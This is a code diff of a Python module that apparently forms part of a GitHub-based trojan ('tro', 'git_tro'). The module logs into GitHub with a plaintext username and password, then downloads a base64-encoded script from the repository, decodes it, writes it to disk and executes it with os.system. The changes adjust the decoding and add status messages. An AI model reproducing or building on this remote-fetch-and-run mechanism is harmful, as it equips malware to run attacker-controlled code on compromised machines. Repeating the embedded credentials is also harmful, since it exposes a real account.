@@ -3,8 +3,10 @@ import json
 import base64
 import os
 
-scriptPath = "scripts/test.txt" #"modules/dirlister.py" #
+scriptPath = "scripts/test" #"modules/dirlister.py" #
 ScriptExec = "python "
+encodedFiles  = False
+
 def connect_to_github():
 	gh = login(username="MarvenGarsalli",password="1'mfor1am")
 	repo = gh.repository("MarvenGarsalli","tro")
@@ -18,6 +20,8 @@ def get_file_contents(filepath):
 		if filepath in filename.path:
 			print("[OK] Found file %s" % filepath)
 			blob = repo.blob(filename._json_data['sha']) #Hashed content
+			if encodedFiles:
+				return base64.b64decode(blob.content)
 			return blob.content
 	return None
 
@@ -26,8 +30,8 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 	script	= get_file_contents(scriptPath)
 	#content = None
 	if script is not None:
-		content	= base64.b64decode(base64.b64decode(script))
-		print content
+		content	= base64.b64decode(script)
+		print(content)
 		try:
 			os.makedirs("scripts", mode=777)
 		except:
@@ -35,11 +39,13 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		fich = open(scriptPath, "w")
 		fich.write(content)
 		fich.close()
-		#print(scriptPath)
+		print(scriptPath)
 		os.system(ScriptExec+" "+scriptPath) #os.execv("scripts/test.py") #Permission denied
+		return str("getRunScript: script {} successfully started".format(scriptPath))
 	else:
+		print(" Unable to find file")
 		#TODO: Customize log file path
-		os.system("echo 'getRunScript: Unable to find file {}' >> logFile.log".format(scriptPath))
-		return None
+		#os.system("echo 'getRunScript: Unable to find file {}' >> logFile.log".format(scriptPath))
+		return str("getRunScript: Unable to find script {}".format(scriptPath))
 	return 
 
